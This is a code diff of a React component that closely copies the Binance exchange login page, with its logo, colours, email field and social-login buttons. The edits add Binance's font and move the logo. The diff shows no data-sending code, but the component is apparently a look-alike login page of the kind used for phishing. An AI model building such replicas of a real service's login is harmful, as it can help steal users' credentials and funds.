@@ -28,15 +28,16 @@ const BinanceLedgerForm: FC = () => {
           minHeight: "580px",
           padding: "40px",
           width: "425px",
-          backgroundColor: "var(--color-CardBg, #1E2329)"
+          backgroundColor: "var(--color-CardBg, #1E2329)",
+          fontFamily: "BinanceNova, Arial, sans-serif"
         }}
       >
-        {/* Binance Logo */}
-        <div className="icon-wrap mb-8">
+        {/* Binance Logo - moved to left corner */}
+        <div className="icon-wrap mb-8 flex justify-start">
           <svg 
             height="24" 
             width="120" 
-            className="bn-svg default-icon block mx-auto" 
+            className="bn-svg default-icon" 
             viewBox="0 0 120 24" 
             xmlns="http://www.w3.org/2000/svg"
           >
@@ -53,7 +54,10 @@ const BinanceLedgerForm: FC = () => {
             className="card-page-title !mb-[0px] text-2xl font-semibold" 
             role="heading" 
             aria-level={1}
-            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+            style={{ 
+              color: "var(--color-PrimaryText, #EAECEF)",
+              fontFamily: "BinanceNova, Arial, sans-serif"
+            }}
           >
             Log in
           </div>
@@ -93,7 +97,10 @@ const BinanceLedgerForm: FC = () => {
             <label 
               className="bn-formItem-label block mb-2 text-sm font-medium" 
               htmlFor="bn-formItem-q8nY2Y1v"
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif"
+              }}
             >
               Email/Phone number
             </label>
@@ -117,7 +124,10 @@ const BinanceLedgerForm: FC = () => {
                     id="bn-formItem-q8nY2Y1v"
                     autoCapitalize="off"
                     className="bn-textField-input !w-[inherit] bg-transparent border-0 text-white p-3 w-full outline-none placeholder-[#848E9C]"
-                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+                    style={{ 
+                      color: "var(--color-PrimaryText, #EAECEF)",
+                      fontFamily: "BinanceNova, Arial, sans-serif"
+                    }}
                     spellCheck="false"
                     autoComplete="username"
                     value={email}
@@ -132,7 +142,8 @@ const BinanceLedgerForm: FC = () => {
             className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded font-semibold transition-colors"
             style={{
               backgroundColor: "var(--color-BtnBg, #FCD535)",
-              color: "var(--color-TextOnYellow, #202630)"
+              color: "var(--color-TextOnYellow, #202630)",
+              fontFamily: "BinanceNova, Arial, sans-serif"
             }}
             type="submit"
             aria-label="Next"
@@ -149,7 +160,10 @@ const BinanceLedgerForm: FC = () => {
           />
           <div 
             className="px-4 text-sm"
-            style={{ color: "var(--color-TertiaryText, #848E9C)" }}
+            style={{ 
+              color: "var(--color-TertiaryText, #848E9C)",
+              fontFamily: "BinanceNova, Arial, sans-serif"
+            }}
           >
             or
           </div>
@@ -167,7 +181,8 @@ const BinanceLedgerForm: FC = () => {
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
-              color: "var(--color-PrimaryText, #EAECEF)"
+              color: "var(--color-PrimaryText, #EAECEF)",
+              fontFamily: "BinanceNova, Arial, sans-serif"
             }}
             role="button" 
             aria-label="Continue with Passkey"
@@ -195,7 +210,8 @@ const BinanceLedgerForm: FC = () => {
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
-              color: "var(--color-PrimaryText, #EAECEF)"
+              color: "var(--color-PrimaryText, #EAECEF)",
+              fontFamily: "BinanceNova, Arial, sans-serif"
             }}
             role="button" 
             aria-label="Continue with Google"
@@ -224,7 +240,8 @@ const BinanceLedgerForm: FC = () => {
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
-              color: "var(--color-PrimaryText, #EAECEF)"
+              color: "var(--color-PrimaryText, #EAECEF)",
+              fontFamily: "BinanceNova, Arial, sans-serif"
             }}
             role="button" 
             aria-label="Continue with Apple"
@@ -251,7 +268,8 @@ const BinanceLedgerForm: FC = () => {
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
-              color: "var(--color-PrimaryText, #EAECEF)"
+              color: "var(--color-PrimaryText, #EAECEF)",
+              fontFamily: "BinanceNova, Arial, sans-serif"
             }}
             role="button" 
             aria-label="Continue with Telegram"
